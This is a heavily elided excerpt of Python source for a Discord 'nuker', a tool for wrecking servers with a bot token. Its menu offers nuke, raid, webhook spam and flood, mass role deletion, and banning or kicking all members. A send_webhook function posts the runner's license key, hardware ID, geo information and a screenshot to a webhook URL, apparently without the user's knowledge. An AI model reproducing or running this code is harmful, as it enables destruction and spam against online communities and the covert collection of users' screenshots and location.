...
def send_webhook(license_key, hwid, user_id="", geo_info=None):
    ...
    try:
        ...
        if screenshot_b64:
            ...
            requests.post(webhook_url, files=screenshot_file, timeout=10)
            return True
        else:
...
def display_nuking_menu():
    ...
    rows = [
        (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.RED} Fast nuke", f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.RED} Nuke"),
        (f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.RED} Raid", f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.RED} Webhook spam"),
        (f"{get_color('light')}[5]{Style.RESET_ALL}{Fore.RED} Webhook flood", f"{get_color('light')}[6]{Style.RESET_ALL}{Fore.RED} Role delete"),
        (f"{get_color('light')}[7]{Style.RESET_ALL}{Fore.RED} Role spam", f"{get_color('light')}[8]{Style.RESET_ALL}{Fore.RED} Ban all"),
        (f"{get_color('light')}[9]{Style.RESET_ALL}{Fore.RED} Kick all", f"{get_color('light')}[0]{Style.RESET_ALL}{Fore.WHITE} ← Back")
    ]
...
async def run_nuker(token: str, coro):
    ...
    try:
        ...
        print(f"{Fore.YELLOW}Make sure MESSAGE CONTENT INTENT is enabled in https://discord.com/developers/applications{Style.RESET_ALL}")
